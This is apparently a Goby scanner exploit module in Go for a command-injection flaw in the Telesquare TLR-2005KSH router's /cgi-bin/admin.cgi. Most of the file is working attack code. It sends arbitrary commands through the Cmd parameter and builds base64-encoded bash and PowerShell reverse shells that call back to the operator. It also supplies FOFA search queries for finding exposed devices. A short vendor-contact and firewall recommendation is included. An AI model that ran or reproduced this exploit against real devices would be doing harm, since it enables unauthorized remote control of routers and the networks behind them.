package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Telesquare TLR-2005KSH /cgi-bin/admin.cgi Command Execution Vulnerability",
    "Description": "<p>The Telesquare TLR-2005KSH Router is a networking device from Telesquare designed to provide users with reliable network connectivity and high-performance routing capabilities. This vulnerability can be exploited to execute arbitrary code on the server side, write to the backend, gain privileges on the server, and then take control of the entire web server.</p>",
    "Product": "TELESQUARE-TLR-2005KSH",
    "Homepage": "http://telesquare.co.kr/",
    "DisclosureDate": "2024-04-08",
    "PostTime": "2024-04-10",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "GobyQuery": "title=\"TLR-2005KSH\" || banner=\"TLR-2005KSH login:\"",
    "Level": "3",
    "Impact": "<p>This vulnerability can be exploited to execute arbitrary code on the server side, write to the backend, gain privileges on the server, and then take control of the entire web server.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"http://telesquare.co.kr/\">http://telesquare.co.kr/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ifconfig",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.1",
    "Translation": {
        "CN": {
            "Name": "Telesquare TLR-2005KSH路由器 /cgi-bin/admin.cgi 命令执行漏洞",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>Telesquare TLR-2005KSH 路由器是由 Telesquare 提供的一款网络设备，旨在为用户提供可靠的网络连接和高性能的路由功能。攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://telesquare.co.kr/\" target=\"_blank\">http://telesquare.co.kr/</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Telesquare TLR-2005KSH /cgi-bin/admin.cgi Command Execution Vulnerability",
            "Product": "TELESQUARE-TLR-2005KSH",
            "Description": "<p>The Telesquare TLR-2005KSH Router is a networking device from Telesquare designed to provide users with reliable network connectivity and high-performance routing capabilities. This vulnerability can be exploited to execute arbitrary code on the server side, write to the backend, gain privileges on the server, and then take control of the entire web server.<br></p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"http://telesquare.co.kr/\" target=\"_blank\">http://telesquare.co.kr/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>This vulnerability can be exploited to execute arbitrary code on the server side, write to the backend, gain privileges on the server, and then take control of the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10941"
}`
	setGetRequestHash0008 := func(hostInfo *httpclient.FixUrl, url string) (*httpclient.HttpResponse, error) {
		head := map[string]string{
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
		}
		GetRequest := httpclient.NewGetRequestConfig(url)
		GetRequest.VerifyTls = false
		GetRequest.FollowRedirect = false
		for headName, headValue := range head {
			GetRequest.Header.Store(headName, headValue)
		}
		if resp, err := httpclient.DoHttpRequest(hostInfo, GetRequest); resp != nil && resp.StatusCode == 200 {
			return resp, err
		} else {
			return nil, err
		}
	}

	setReverseRequestHash0008 := func(reverseType string, isBase64 bool, isFull bool) (string, chan string, error) {
		typeList := map[string]string{
			"reverse_java":    "reverse_java",
			"reverse_windows": "reverse_windows",
			"reverse_linux":   "reverse_linux",
		}
		if revserTypeNew := typeList[reverseType]; revserTypeNew == "" {
			return "", nil, errors.New("reverse type error")
		}
		waitSessionCh := make(chan string)
		if rp, err := godclient.WaitSession(reverseType, waitSessionCh); err != nil || len(rp) >= 0 {
			if reverseType == "reverse_windows" {
				command := godclient.ReverseTCPByPowershell(rp)
				if isBase64 {
					utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
					bytes := make([]byte, len(utf16Bytes)*2)
					for i, v := range utf16Bytes {
						bytes[i*2] = byte(v)
						bytes[i*2+1] = byte(v >> 8)
					}
					command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
				}
				if isFull {
					command = strings.Replace(command, "powershell", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 1)
				}
				return command, waitSessionCh, nil
			} else if reverseType == "reverse_linux" {
				command := godclient.ReverseTCPBySh(rp)
				if isBase64 {
					command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
				}
				if isFull {
					command = strings.Replace(command, "bash", "/bin/bash", 1)
				}
				return command, waitSessionCh, nil
			}
		}
		return "", waitSessionCh, errors.New("reverse port error")
	}

	//等待反弹shell
	setReverseWaittingHash0008 := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
		select {
		case webConsleID := <-waitSessionCh:
			if u, err := url.Parse(webConsleID); err == nil {
				expResult.Success = true
				expResult.OutputType = "html"
				sid := strings.Join(u.Query()["id"], "")
				expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
			}
		case <-time.After(time.Second * 25):
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig"
			if resp, _ := setGetRequestHash0008(hostInfo, url); resp != nil && strings.Contains(resp.RawBody, "CmdResult") {
				ss.VulURL = hostInfo.FixedHostInfo + url
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "cmd" {
				command := goutils.B2S(ss.Params["cmd"])
				url := "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=" + strings.ReplaceAll(url.QueryEscape(command), "+", "%20")
				if resp, err := setGetRequestHash0008(expResult.HostInfo, url); resp != nil && len(resp.RawBody) > 0 {
					rawbody := strings.ReplaceAll(strings.ReplaceAll(resp.RawBody, "<CmdResult><![CDATA[", ""), "]]></CmdResult>", "")
					expResult.Success = true
					expResult.Output = rawbody
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			} else if attacktype == "reverse" {
				reverseType := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequestHash0008(reverseType, true, false); command != "" {
					url := "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=" + strings.ReplaceAll(url.QueryEscape(command), "+", "%20")
					go setGetRequestHash0008(expResult.HostInfo, url)
					setReverseWaittingHash0008(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
